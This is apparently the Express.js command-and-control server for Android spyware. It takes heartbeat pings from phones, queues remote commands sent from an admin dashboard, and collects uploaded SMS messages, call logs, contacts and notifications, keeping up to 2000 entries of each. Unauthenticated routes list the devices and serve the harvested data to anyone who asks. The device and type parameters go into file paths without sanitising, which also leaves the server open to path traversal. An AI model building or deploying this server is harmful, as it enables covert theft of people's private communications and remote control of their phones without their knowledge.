const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let devicesStatus = {}; 

// ==================================================
// 📲 PHONE SIDE (App Side)
// ==================================================

app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging } = req.body; 
    if (!device_id) {
        console.log("⚠️ REJECTED: Ping received without Device ID");
        return res.status(400).json({ error: "No Device ID" });
    }

    device_id = device_id.toUpperCase();

    // Check if there is a pending command
    const pendingCommand = (devicesStatus[device_id] && devicesStatus[device_id].command) ? devicesStatus[device_id].command : "none";

    // Update status
    devicesStatus[device_id] = {
        id: device_id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lastSeen: Date.now(),
        command: "none" 
    };

    // DEBUG LOG
    console.log(`-------------------------------------------`);
    console.log(`📡 PING RECEIVED | ID: ${device_id} | Model: ${model}`);
    console.log(`🔋 Battery: ${battery}% | Charging: ${charging}`);
    console.log(`✉️ Command Sent to Phone: ${pendingCommand}`);
    console.log(`-------------------------------------------`);

    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    device_id = device_id.toUpperCase();
    console.log(`📥 UPLOAD ATTEMPT | ID: ${device_id} | Type: ${type}`);

    let parsedData;
    try {
        parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        
        // CHECK: Kya data khali toh nahi?
        if (!parsedData || (Array.isArray(parsedData) && parsedData.length === 0)) {
            console.log(`⚠️ WARNING: [${device_id}] ne [${type}] bhej toh diya, par DATA KHALI (Empty) hai!`);
        } else {
            const count = Array.isArray(parsedData) ? parsedData.length : "1 Object";
            console.log(`✅ SUCCESS: [${device_id}] received ${count} entries for ${type}`);
        }
    } catch (e) {
        console.log(`❌ ERROR: [${device_id}] ne invalid data bheja. Parse nahi ho raha.`);
        return res.status(400).json({ error: "Invalid JSON" });
    }

    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    try {
        let finalData;
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];

        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try {
                    const content = fs.readFileSync(filePath, 'utf8');
                    existingData = JSON.parse(content);
                } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];

            if (Array.isArray(parsedData)) {
                finalData = [...parsedData, ...existingData].slice(0, 2000); 
            } else {
                existingData.unshift(parsedData);
                finalData = existingData.slice(0, 2000);
            }
        } else {
            finalData = parsedData;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ FILE SAVE ERROR [${device_id}]:`, error);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 DASHBOARD SIDE (Admin Side)
// ==================================================

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if(!device_id) return res.status(400).json({error: "ID required"});
    
    device_id = device_id.toUpperCase();

    if (!devicesStatus[device_id]) {
        devicesStatus[device_id] = { id: device_id, model: "Unknown", lastSeen: 0 };
    }
    
    devicesStatus[device_id].command = command;
    console.log(`🚀 ADMIN COMMAND QUEUED | Target: ${device_id} | Cmd: ${command}`);
    res.json({ status: "success", queuedCommand: command });
});

// Baaki routes (all-devices aur get-data) wahi rahenge
app.get('/api/admin/all-devices', (req, res) => {
    const files = fs.readdirSync(UPLOADS_DIR);
    let deviceList = {};
    files.forEach(file => {
        const deviceId = file.split('_')[0].toUpperCase();
        if (!deviceList[deviceId]) {
            const isOnline = devicesStatus[deviceId] ? (Date.now() - devicesStatus[deviceId].lastSeen < 60000) : false;
            deviceList[deviceId] = {
                id: deviceId,
                model: devicesStatus[deviceId]?.model || "Offline",
                isOnline: isOnline,
                battery: devicesStatus[deviceId]?.battery || "--"
            };
        }
    });
    res.json(deviceList);
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const devId = req.params.device_id.toUpperCase();
    const type = req.params.type;
    const filePath = path.join(UPLOADS_DIR, `${devId}_${type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
    console.log(`📂 Storage Path: ${UPLOADS_DIR}`);
});
